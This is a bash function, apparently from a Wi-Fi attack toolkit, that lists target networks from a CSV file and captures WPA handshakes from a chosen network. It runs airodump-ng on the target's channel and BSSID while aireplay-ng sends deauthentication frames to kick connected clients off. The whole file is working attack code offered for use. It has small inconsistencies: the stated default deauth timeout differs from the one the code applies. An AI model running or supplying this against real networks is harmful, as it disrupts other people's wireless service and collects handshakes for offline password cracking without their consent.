function Capture_Handshake(){

    CSV_FILE="${BatLinux["Main_DIR"]}/${BatLinux["Networks_File"]}"
    selected=0
    IFS=$'\n' read -d '' -r -a lines < <(tail -n +2 "$CSV_FILE")
    total_lines=${#lines[@]}

    Draw_Network_Menu() {
    clear
    echo "=== Capture Handshake ==="
    echo "---------------------------------------------------"
    echo "ESSID • BSSID • Channel • WPS"
        for i in "${!lines[@]}"; do
            IFS=',' read -r ESSID BSSID Channel WPS Note <<< "${lines[$i]}"
            if [ $i -eq $selected ]; then
                echo -e ">\e[96m $ESSID • $BSSID • $Channel • WPS $WPS\e[0m"
                selected_note="$Note"
            else
                echo -e "$ESSID •  $BSSID •  $Channel"
            fi
        done
        echo "---------------------------------------------------"
        echo "[Note] $selected_note"
    }

function Capture() {
    clear
    IFS=',' read -r ESSID BSSID Channel Note <<< "${lines[$selected]}"
    read -p $'\e[32mDeauth aireplay attack timeout in seconds or [Enter] to accept the proposal [10]:\e[0m ' deauth
    deauth=${deauth:-25}
    airodump-ng -c $Channel --bssid $BSSID -w "${BatLinux["Main_DIR"]}/${BatLinux["HandShakes_DIR"]}/$ESSID" --output-format pcap wlan0 &
    xterm -e aireplay-ng --deauth $deauth -a $BSSID wlan0 
    echo -e "\e[32mStarting capture and deauth attack...\e[0m"
    wait
    Capture_Handshake
}

# Handle keyboard input
while true; do
    Draw_Network_Menu
    read -rsn1 key
    case "$key" in
        $'\x1B')  # Handle arrow keys
            read -rsn2 key
            case "$key" in
                "[A") # Up arrow
                    ((selected--))
                    [ $selected -lt 0 ] && selected=$((total_lines-1))
                    ;;
                "[B") # Down arrow
                    ((selected++))
                    [ $selected -ge $total_lines ] && selected=0
                    ;;
            esac
            ;;
        "") # Enter key
            Capture
            break 
            ;;
        [qQ]) # Quit
            clear
            return
            ;;
    esac
    done

}